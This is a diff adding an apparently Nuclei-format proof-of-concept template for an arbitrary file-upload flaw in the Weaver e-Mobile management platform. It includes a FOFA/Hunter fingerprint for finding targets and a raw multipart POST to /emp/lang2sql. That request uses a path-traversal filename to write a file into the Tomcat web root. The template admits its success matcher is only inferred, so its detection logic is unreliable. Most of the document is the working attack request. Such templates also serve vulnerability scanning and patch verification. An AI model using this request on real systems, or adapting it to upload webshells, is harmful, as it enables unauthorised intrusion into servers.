@@ -1,0 +1,51 @@
+id: poc-478060ec6875fabe44f5
+info:
+  name: 泛微e-Mobile移动管理平台文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/478060ec6875fabe44f54ab8852a34e7
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 478060ec6875fabe44f54ab8852a34e7
+    fofa: + hunter`app.name="泛微 e-Mobile 移动管理平台"`
+http:
+- raw:
+  - 'POST /emp/lang2sql?client_type=1&lang_tag=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
+
+    Upgrade-Insecure-Requests: 1
+
+    SL-CE-SUID: 15
+
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+
+    Content-Length: 235
+
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="source"
+
+
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="file"; filename="../../../../appsvr/tomcat/webapps/ROOT/x.txt"
+
+
+    test
+
+    --00content0boundary00--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
